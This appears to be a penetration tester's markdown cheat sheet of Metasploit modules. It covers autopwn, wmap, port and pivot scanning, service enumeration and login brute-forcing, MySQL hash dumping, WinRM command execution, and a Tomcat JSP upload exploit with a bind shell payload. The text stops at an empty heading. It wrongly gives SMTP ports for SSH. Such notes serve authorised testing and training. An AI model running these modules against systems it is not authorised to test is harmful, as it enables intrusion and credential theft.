# Initial Scanning Modules

# Autopwn
wget or git clone from github
move to metasploit plugins:
```
sudo mv <autopwn file> /usr/share/metasploit-framework/plugins/
```
load autopwn
```
#in metasploit
load db_autopwn
```
using autopwn
```
autopwn -p -t -PI

analyze
```

# Wmap
Used for web app enumeration
```
service postgresql start
msfconsole
msf5 > load wmap
msf5 > help

# wmap Commands
# =============
#
#    Command       Description
#    -------       -----------
#    wmap_modules  Manage wmap modules
#    wmap_nodes    Manage nodes
#    wmap_run      Test targets
#    wmap_sites    Manage sites
#    wmap_targets  Manage targets
#    wmap_vulns    Display web vulns


```

# Port Scanning
```
search portscan
use auxiliary/scanner/portscan/tcp
```

# Pivot Scanning:
```
# From within the meterpreter session of inital foothold
run autoroute -s <ip of target #2>

# Background meterpreter of initial foothold
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/discovery/udp_sweep


```

# FTP modules:
```
use auxiliary/scanner/ftp/ftp_login
use auxiliary/scanner/ftp/anonymous
```

# SSH modules:
Ports 25, 465, 587
```
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_enumusers
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/ssh/ssh_pubkeys
```

# SMTP modules:
```
use auxiliary/scanner/smtp/smtp_version
use auxiliary/scanner/smtp/smtp_enum
```

# HTTP modules:
```
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/files_dir
use auxiliary/scanner/http/http_login
use auxiliary/scanner/http/apache_userdir_enum
```


# SMB modules:
```
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_login
```

# MySQL
```
auxiliary/admin/mysql/mysql_enum
auxiliary/admin/mysql/mysql_sql
auxiliary/scanner/mysql/mysql_file_enum
auxiliary/scanner/mysql/mysql_hashdump
auxiliary/scanner/mysql/mysql_login
auxiliary/scanner/mysql/mysql_schemadump
auxiliary/scanner/mysql/mysql_version
auxiliary/scanner/mysql/mysql_writable_dirs
```

# WinRM
Ports 5985, 5986

```
auxiliary/scanner/winrm/winrm_auth_methods
auxiliary/scanner/winrm/winrm_login
auxiliary/scanner/winrm/winrm_cmd
auxiliary/scanner/winrm/winrm_script_exec
```

# HTTP/S
Port 80,443,8000,8080

### Apache Tomcat
```
use exploit/multi/http/tomcat_jsp_upload_bypass
set payload java/jsp_shell_bind_tcp
```

### Rejetto hfs